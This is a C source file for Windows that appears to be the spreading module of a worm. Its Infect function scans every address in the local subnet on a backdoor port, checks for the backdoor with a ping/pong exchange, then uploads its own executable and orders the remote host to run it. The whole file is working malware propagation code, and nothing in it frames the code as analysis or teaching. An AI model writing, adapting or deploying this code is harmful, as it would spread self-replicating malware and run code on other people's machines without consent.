#define WIN32_LEAN_AND_MEAN
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#include "WormProc.h"
#include "../Common/socktool.h"
#include "../Hole/Hole.h"

#ifndef DEBUG
#define DEBUG(fmt, ...) (_tprintf(_T(fmt), __VA_ARGS__))
#endif

code_t RecvCode(SOCKET s)
{
	code_t c;
	if (recv(s, &c, sizeof(c), 0) <= 0) {
		return REPLY_NONE;
	}
	return c;
}

BOOL SendCode(SOCKET s, code_t c)
{
	if (send(s, &c, sizeof(c), 0) <= 0) {
		return FALSE;
	}
	return TRUE;
}

BOOL SendFile(SOCKET s, LPCTSTR lpFileName)
{
	HANDLE hFile;
	BOOL bResult;
	if ((hFile = CreateFile(
		lpFileName,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	)) == INVALID_HANDLE_VALUE) {
		DEBUG("open %s fails: %d\n",
			lpFileName, GetLastError());
		return FALSE;
	}
	CHAR buffer[4096];
	DWORD iRead;
	DWORD iTotal = 0;
	while (TRUE) {
		if (!(bResult = ReadFile(
			hFile,
			buffer,
			sizeof(buffer),
			&iRead,
			0))) {
			DEBUG("Read %s error: %d\n",
				lpFileName, GetLastError());
		}
		if (iRead > 0) {
			SendAll(s,
				buffer,
				iRead,
				0);
			iTotal += iRead;
			DEBUG("Send %d\n", iRead);
		}
		else {
			break;
		}
	}
	CloseHandle(hFile);
	return bResult;
}

BOOL Infect(LPCTSTR lpFileName)
{
	TCHAR szFileName[MAX_PATH];
	CHAR ip[32];
	INT i1, i2, i3, i4;
	SOCKET s;
	WSADATA wsaData;
	HMODULE hModule;
	BOOL iResult;
	if (!lpFileName) {
		hModule = GetModuleHandle(NULL);
		GetModuleFileName(
			hModule,
			szFileName,
			MAX_PATH);
		lpFileName = szFileName;
	}

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		DEBUG("client: WSAStartup failed with error: %d\n",
			iResult);
		return FALSE;
	}
	GetLocalIP(ip, sizeof(ip));
	sscanf_s(ip, "%d.%d.%d.%d",
		&i1, &i2, &i3, &i4);
	for (INT i = 1; i < 255; i++) {
		sprintf_s(ip, sizeof(ip),
			"%d.%d.%d.%d", i1, i2, i3, i);
		printf("test %s\n", ip);
		s = CreateSocket(ip, HOLE_PORT, DEFAULT_CONNECT_TIMEOUT);
		if (s != INVALID_SOCKET) {
			DEBUG("Send PING\n");
			SendCode(s, CMD_PING);
			code_t code = RecvCode(s);
			if (code == REPLY_PONG) {
				DEBUG("Recv PONG\n");
				DEBUG("Send EXEC\n");
				SendCode(s, CMD_EXEC);
				DEBUG("Send %s\n", lpFileName);
				SendFile(s, lpFileName);
				shutdown(s, SD_SEND);
				code = RecvCode(s);				
				if (code == REPLY_EXEC_DONE) {
					DEBUG("Exec successfully\n");
				}
				else {
					DEBUG("Exec failed\n");
				}
			}
			shutdown(s, SD_BOTH);
			closesocket(s);
		}
	}
	WSACleanup();
	return TRUE;
}